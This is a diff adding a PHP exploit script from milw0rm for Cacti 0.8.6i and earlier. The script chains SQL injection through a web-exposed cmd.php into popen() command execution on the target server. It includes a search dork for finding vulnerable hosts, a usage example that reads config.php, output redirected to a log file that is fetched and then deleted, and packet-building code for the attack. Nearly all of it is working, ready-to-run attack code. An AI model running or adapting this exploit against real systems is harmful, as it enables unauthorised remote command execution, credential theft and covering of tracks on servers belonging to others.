@@ -1,0 +1,208 @@
+<?php
+print_r('
+--------------------------------------------------------------------------------
+Cacti <= 0.8.6i "cmd.php" popen() injection
+by rgod
+dork: intitle:"login to cacti"
+mail: retrog at alice dot it
+site: http://retrogod.altervista.org
+--------------------------------------------------------------------------------
+');
+
+if ($argc<4) {
+    print_r('
+--------------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      path to Cacti
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' localhost /cacti/ ls -la -P1.1.1.1:80
+php '.$argv[0].' localhost / cat ./include/config.php -p81
+--------------------------------------------------------------------------------
+');
+    die;
+}
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function sendpacketii($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$port=80;
+$proxy="";
+$cmd="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p")
+and ($temp<>"-P")
+) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+function my_encode($my_string)
+{
+  $encoded="CHAR(";
+  for ($k=0; $k<=strlen($my_string)-1; $k++)
+  {
+    $encoded.=ord($my_string[$k]);
+    if ($k==strlen($my_string)-1) {$encoded.=")";}
+    else {$encoded.=",";}
+  }
+  return $encoded;
+}
+/*
+software site: http://cacti.net/
+
+the cmd.php is not properly protected:
+
+...
+if (!isset($_SERVER["argv"][0])) {
+	die("<br><strong>This script is only meant to run at the command line.</strong>");
+}
+...
+
+if register_argc_argv = on, you can have web access, poc:
+
+http://[target]/[path]/cmd.php?1
+
+now you can inject sql commands, ex. in this query:
+
+...
+			$polling_items = db_fetch_assoc("SELECT * from poller_item " .
+					"WHERE (host_id >= " .
+					$_SERVER["argv"][1] .
+					" and host_id <= " .
+					$_SERVER["argv"][2] . ") ORDER by host_id");
+...
+
+and you can poison the $polling_items array that becomes like this:
+
+Array
+(
+    [0] => Array
+        (
+            [local_data_id] => 2
+            [poller_id] => 0
+            [host_id] => 1
+            [action] => 1
+            [hostname] => 127.0.0.1
+            [snmp_community] =>
+            [snmp_version] => 1
+            [snmp_username] =>
+            [snmp_password] =>
+            [snmp_port] => 161
+            [snmp_timeout] => 500
+            [rrd_name] => proc
+            [rrd_path] =>
+            [rrd_num] => 1
+            [rrd_step] => 300
+            [rrd_next_step] => 0
+            [arg1] =>  [your command]
+            [arg2] =>
+            [arg3] =>
+        )
+
+)
+
+$polling_items[arg1] is passed to a popen() call in /include/poller.php,
+see exec_poll() function...
+
+you do not have any output but you can redirect it to some file in /rra
+or /log folder which is 'cactiuser''
+
+*/
+
+$command=my_encode($cmd." > ./rra/suntzu.log");
+$h=my_encode("127.0.0.1");
+$pr=my_encode("proc");
+$sql="1111)/**/UNION/**/SELECT/**/2,0,1,1,$h,null,1,null,null,161,500,$pr,null,1,300,0,$command,null,null/**/FROM/**/host/*";
+$packet ="GET ".$p."cmd.php?1+$sql+11111 HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+sleep(2);
+
+$packet ="GET ".$p."rra/suntzu.log HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+echo $html;
+
+$command=my_encode("rm ./rra/suntzu.log");
+$sql="1111)/**/UNION/**/SELECT/**/2,0,1,1,$h,null,1,null,null,161,500,$pr,null,1,300,0,$command,null,null/**/FROM/**/host/*";
+$packet ="GET ".$p."cmd.php?1+$sql+11111 HTTP/1.0\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacketii($packet);
+
+?>
+
+# milw0rm.com [2006-12-27]
